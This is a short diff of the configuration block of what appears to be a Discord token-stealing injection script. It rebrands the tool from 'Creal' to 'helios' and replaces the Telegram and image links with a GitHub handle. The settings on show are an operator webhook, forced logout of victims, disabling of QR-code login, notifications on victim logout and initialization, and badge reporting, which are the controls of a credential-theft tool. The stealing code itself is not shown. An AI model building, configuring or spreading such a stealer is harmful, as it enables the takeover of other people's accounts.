@@ -11,25 +11,25 @@ const fs = require("fs");
 //  ###
 
 var config = {
-    brand: "Creal",
+    brand: "helios",
 
-    webhook: "%WEBHOOK%",
+    webhook: "",
 
     logout: true,
     disable_qr_code: true,
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@Creal"],
+    ping: [true, "@helios"],
 
     embed: {
-        username: "Creal | https://t.me/crealdevelopment",
+        username: "helios| github.com/Ayhuuu",
         footer: {
-            text: `Creal | https://t.me/crealdevelopment`,
-            icon_url: "https://cdn.discordapp.com/attachments/864559355768602654/1046085069997092884/9a0e7d1e4466048035222a76f1c3c6d3.png",
+            text: `helios | github.com/Ayhuuu`,
+            icon_url: "https://cdn.discordapp.com/attachments/864559355768602654/1047895338771546122/image.png",
         },
-        href: "https://t.me/crealdevelopment",
-        avatar_url: "https://cdn.discordapp.com/attachments/864559355768602654/1046085069997092884/9a0e7d1e4466048035222a76f1c3c6d3.png"
+        href: "github.com/Ayhuuu",
+        avatar_url: "https://cdn.discordapp.com/attachments/864559355768602654/1047895338771546122/image.png"
     },
 
     badges: {
